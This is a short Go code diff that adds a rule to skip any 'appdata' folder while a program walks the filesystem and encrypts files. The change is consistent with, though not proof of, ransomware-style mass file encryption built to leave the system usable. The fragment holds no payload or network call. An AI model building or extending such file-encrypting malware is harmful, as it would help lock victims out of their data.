@@ -177,6 +177,9 @@ func main() {
 
 		// Don't encrypt directories
 		if info.IsDir() {
+			if strings.ToLower(info.Name()) == "appdata" {
+				return filepath.SkipDir
+			}
 			return nil
 		}
 
